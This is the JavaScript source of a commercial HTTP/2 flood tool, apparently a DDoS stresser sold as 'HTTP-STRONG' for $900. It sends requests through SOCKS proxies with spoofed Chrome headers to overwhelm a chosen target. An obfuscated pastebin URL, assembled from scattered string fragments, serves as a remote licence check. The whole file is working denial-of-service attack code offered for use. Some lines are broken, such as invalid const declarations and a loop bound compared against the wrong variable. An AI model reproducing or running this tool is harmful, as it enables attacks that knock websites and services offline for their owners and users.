const url = require('url'),
const fs = require('fs'),
const gradient = require('gradient-string'),
const cluster = require('cluster'),
const requests = require('request'),
const { HeaderGenerator } = require('header-generator');
	
const EventEmitter = require('events')	
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);	

const { SocksClient } = require('socks')
const events = require('events')
events.defaultMaxListeners = 0

const tls = require('tls')
const dns = require('dns')
const http2 = require('http2')
const { PassThrough } = require('stream');
const JSStreamSocket = (new tls.TLSSocket(new PassThrough()))._handle._parentWrap.constructor;

const sdasd = 'https://'
const qaiwdhjuwdj = 'p';
const uqwdf = 'aste';
const msidstressgay = 'bin';
const meowgay = '.';
const meowmsidstressgay = 'c';
const kkkkkkkkas = 'om';
const rawseajd = '/ra';
const aosdokawod = 'w/';
const oooooaasdas = 'b5UuNZRL';
protone = {
    url: sdasd + qaiwdhjuwdj + uqwdf + msidstressgay + meowgay + meowmsidstressgay + kkkkkkkkas + rawseajd + aosdokawod + oooooaasdas
};

function getArgs() {
    const _0 = {};
    process.argv.slice(2, process.argv.length).forEach((_1) => {
        if (_1.slice(0, 2) === '--') {
            const _3 = _1.split('=');
            const _4 = _3[0].slice(2, _3[0].length);
            const _5 = _3.length > 1 ? _3[1] : true;
            _0[_4] = _5
        } else {
            if (_1[0] === '-') {
                const _2 = _1.slice(1, _1.length).split('');
                _2.forEach((_1) => {
                    _0[_1] = true
                })
            }
        }
    });
    return _0
}
const args = getArgs();



var target = args['target'];
var time = args['time'];
var threads = args['threads'];
var ratelimit = args['requests'];
var proxyfile = args['proxy'];	


if(args['debug'] == 'true') {
	process.on('uncaughtException', function(error) {console.log(error)});
	
	process.on('unhandledRejection', function(error) {console.log(error)})
	
} else { 
	process.on('uncaughtException', function(error) {});
	
	process.on('unhandledRejection', function(error) {})
	
}

let headerGenerator = new HeaderGenerator({
    browsers: [
        {name: "chrome", minVersion: 86, httpVersion: "2"},
    ],
    devices: [
        "desktop",
    ],
    operatingSystems: [
        "windows",
    ],
    locales: ["en-US", "en"]
});

if (args['key'] != undefined & args['target'] != undefined & args['time'] != undefined & args['threads'] != undefined & args['requests'] != undefined & args['proxy'] != undefined) {
	
    requests["get"](protone, function(one, two, three) {
		
        if (args['key'] == three) {	
			if (cluster.isPrimary) {
				for (let i = 0; i < threads; i++) {
					cluster.fork();
				}
				cluster.on('exit', (worker, code, signal) => {});
			} else {
				main();
			}		
			
        } else {
			
            console.log(gradient('orange', 'white')('You no buy HTTP-STRONG | Price 900$ | @MSIDSTRESS'));
			
        }
		
    })
	
} else {
	
    console.log(gradient('orange', 'white')('./strong --key= --taret= --time= --threads= --requests= | @MSIDSTRESS'));
	
    process.exit(-1);
	
}



function main() {
	function flood() {
		const url = new URL(target);
		
		let ip = null

		if (target.indexOf(".onion") != -1) {
			ip = url.hostname
		} else {
			setInterval(() => {
				dns.lookup(url.hostname, 4, (err, address, family) => {
					ip = address
				})
			}, 1000)
		}			
	
			var proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');
		setInterval(() => {
			var parts = proxies[Math.floor(Math.random() * proxies.length)];
			parts = parts.split(':');			
			let randomHeaders = headerGenerator.getHeaders();

			if (ip == null)
				return;

			const options = {
				proxy: {
				  host: parts[0],
				  port: Number(parts[1]),
				  type: 4
				},
			  
				command: 'connect',
			  
				destination: {
				  host: ip, 
				  port: url.port == '' ? (url.protocol == 'https:' ? 443 : 80) : Number(url.port)
				}
			  };

			SocksClient.createConnection(options, (err, info) => {
				if (err) {
					return
				}

				function sendRequest(socket) {

					http2.connect(`http://${url.host}${url.pathname}`, {
						createConnection: () => socket,
						settings: {
							headerTableSize: 65536,
							maxConcurrentStreams: 25000,
							initialWindowSize: 1073741823,
							maxSessionMemory: 128000,
							maxDeflateDynamicTableSize: 4294967295,
							maxHeaderListSize: 262144,
							enablePush: false
						}
					}, (session) => {
						function doReq(i) {
							if (i >= requests) {
								return;
							}
							
								const requestHeaders = Object.assign({
									':authority': url.host,
									':method': 'GET',
									':path': url.pathname,
									':scheme': url.protocol.substring(0, url.protocol.length - 1),
								}, {
									'user-agent': randomHeaders['user-agent'],
									'accept': randomHeaders['accept'],
									'accept-language': randomHeaders['accept-language'],
									'accept-encoding': randomHeaders['accept-encoding'],
									'cache-control': 'no-cache, no-store,private, max-age=0, must-revalidate',
									'upgrade-insecure-requests': randomHeaders['upgrade-insecure-requests'],
									'sec-ch-ua': randomHeaders['sec-ch-ua'],
									'sec-ch-ua-mobile': randomHeaders['sec-ch-ua-mobile'],	
									'sec-ch-ua-platform': randomHeaders['sec-ch-ua-platform'],								
									'sec-fetch-dest': randomHeaders['sec-fetch-dest'],
									'sec-fetch-mode': randomHeaders['sec-fetch-mode'],
									'sec-fetch-site': randomHeaders['sec-fetch-site'],
									'x-requested-with': 'XMLHttpRequest',
									'pragma': 'no-cache',
									'cache-control': 'no-cache'
								})
		
							const request = session.request(requestHeaders)
							request.end().on('response', (response) => { doReq(i + 1) })
		
						}
						doReq(0)
					}).on('error', () => {})


					
				}

				if (url.protocol == 'https:') {
					const socket = tls.connect({
						rejectUnauthorized: false,
						servername: url.hostname,
						honorCipherOrder: false, 
						requestCert: true,
						socket: new JSStreamSocket(info.socket),
						secure: true,
						ALPNProtocols: ['h2'],
					}, () => {
						sendRequest(socket)
					})
				} else {
					sendRequest(info.socket)
				}
			})
		}, 10000)		
		
	}
	setInterval(flood);
	setTimeout(function() {
		console.clear();
		process.exit()
	}, time * 1000);
}
	
